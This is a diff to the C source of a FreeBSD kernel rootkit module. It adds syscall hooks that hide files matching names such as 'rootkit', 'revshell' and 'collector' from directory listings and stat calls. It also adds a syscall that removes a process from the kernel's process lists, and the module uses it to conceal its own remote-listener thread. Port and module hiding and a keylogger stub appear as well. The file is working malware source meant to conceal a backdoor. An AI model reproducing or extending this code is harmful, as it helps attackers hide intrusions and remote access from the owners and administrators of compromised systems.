@@ -171,6 +171,30 @@ struct module {
         modspecific_t           data;   /* module specific data */
 };
 
+#define SIZE 10
+static int is_hiding_path(char kpath[MAXPATHLEN]) {
+    char *paths[SIZE] = {
+        "elevate",
+        "rootkit",
+        "revshell",
+        "sender",
+        "collector",
+        "remote",
+        "log.c",
+        "log.h",
+        "log.o",
+        // "logsrc"
+        "hide",
+    };
+    for (int i = 0; i < SIZE; i++) {
+        if (strcasestr(kpath, paths[i]) != NULL) {
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
 static int getdirentries_hook(struct thread *td, void *syscall_args) {
     struct getdirentries_args *uap; 
     uap = (struct getdirentries_args *) syscall_args;
@@ -186,16 +210,15 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
         count = size;
         struct dirent *curr_rec = d;
         while (curr_rec->d_reclen != 0 && count > 0) {
-            count -= curr_rec->d_reclen;
+            count -= curr_rec->d_reclen;            
             // Add more module to hide here
-            if (strcmp(curr_rec->d_name, "hiding.ko") == 0 
-                || strcmp(curr_rec->d_name, "rootkit.ko") == 0
-            ) {
+            if (is_hiding_path(curr_rec->d_name)) {
                 if (count != 0) {
                     memmove((char *) curr_rec, 
                         (char *) curr_rec + curr_rec->d_reclen, count);
                 }
                 size -= curr_rec->d_reclen;
+                continue;
             }
 
             if (count > 0) {
@@ -210,6 +233,18 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
     return error;
 }
 
+static int fstatat_hook(struct thread *td, struct fstatat_args *uap) {
+    char kpath[MAXPATHLEN];
+    size_t done;
+    if (uap->path != NULL) {
+        int error = copyinstr(uap->path, kpath, MAXPATHLEN, &done);
+        if (!error && is_hiding_path(kpath) ) {
+            return ENOENT;
+        }
+    }
+    return sys_fstatat(td, uap);
+}
+
 struct port_hiding_args {
     u_int16_t port;
 };
@@ -222,9 +257,6 @@ port_hiding(struct thread *td, void *syscall_args) {
     INP_INFO_WLOCK(&V_tcbinfo);
 
     CK_LIST_FOREACH(inpb, &V_tcbinfo.ipi_listhead, inp_list){
-        // if (inpb->inp_vflag & INP_TIMEWAIT) {
-        //     continue;
-        // }
         INP_RLOCK(inpb);
         if (ntohs(inpb->inp_lport) == uap->port || 
             ntohs(inpb->inp_fport) == uap->port
@@ -289,6 +321,48 @@ static struct sysent kld_hiding_sysent = {
 
 static int kld_hiding_offset = NO_SYSCALL;
 
+struct proc_hiding_args {
+    pid_t pid;
+};
+static void hide_process(pid_t pid) {
+    struct proc *p;
+    sx_xlock(&allproc_lock);
+
+    FOREACH_PROC_IN_SYSTEM(p) {
+        PROC_LOCK(p);
+        if (p->p_state == PRS_ZOMBIE || (p->p_flag & P_WEXIT)) {
+            PROC_UNLOCK(p);
+            continue;
+        }
+
+        if (p->p_pid == pid) {
+            LIST_REMOVE(p, p_list);
+
+            sx_xlock(PIDHASHLOCK(p->p_pid));
+            LIST_REMOVE(p, p_hash);
+            sx_xunlock(PIDHASHLOCK(p->p_pid));
+        }
+
+        PROC_UNLOCK(p);
+    }
+
+    sx_xunlock(&allproc_lock);
+}
+static int
+proc_hiding(struct thread *td, void *syscall_args) {
+    struct proc_hiding_args *uap = (struct proc_hiding_args *) syscall_args;
+    hide_process(uap->pid);
+    
+    return 0;
+}
+
+static struct sysent proc_hiding_sysent = {
+    .sy_narg   = 1,
+    .sy_call   = (sy_call_t *)proc_hiding,
+    .sy_auevent = AUE_NULL
+};
+static int proc_hiding_offset = NO_SYSCALL;
+
 static int load(module_t module, int cmd, void *arg) {
     (void)module;
     (void)arg;
@@ -311,31 +385,20 @@ static int load(module_t module, int cmd, void *arg) {
         /* Initialize character device interface via interface.c */
         error = make_rootkit_dev();
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
+        sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;
 
         if (error == 0) {
             struct proc *p = NULL;
             error = kproc_create(remote_listener_thread, NULL, &p, 0, 0, "kmod_remote_listen");
-
             // 	init_keylogger(); TODO: Fix this later
             if (error == 0) {
-                // printf("rootkit: module loaded & remote listener active\n");
+                hide_process(p->p_pid);
             } else {
-                // printf("rootkit: device created, failed to start listener (%d)\n", error);
             }
         } else {
             rk_log_uninit();
-            // printf("rootkit: failed to create device (%d)\n", error);
         }
 
-
-
-        // if (error == 0)
-        //     printf("rootkit: module loaded\n");
-        /* TODO: Fix this later
-            // if error == 0 {
-            // 	init_keylogger();
-            // }
-        */
 		// only be initial when device is successfully created
         break;
 
@@ -355,10 +418,10 @@ static int load(module_t module, int cmd, void *arg) {
         cv_broadcast(&remote_cv);
         mtx_unlock(&remote_mtx);
 
-        // cleanup_keylogger();     TODO: Fix this later
 
         cv_destroy(&remote_cv);
         mtx_destroy(&remote_mtx);
+        sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
         printf("rootkit: module unloaded\n");
         break;
 
@@ -382,3 +445,4 @@ static moduledata_t rootkit_module = {
 DECLARE_MODULE(rootkit, rootkit_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 SYSCALL_MODULE(kld_hiding, &kld_hiding_offset, &kld_hiding_sysent, NULL, NULL);
 SYSCALL_MODULE(port_hiding, &port_hiding_offset, &port_hiding_sysent, NULL, NULL);
+SYSCALL_MODULE(proc_hiding, &proc_hiding_offset, &proc_hiding_sysent, NULL, NULL);
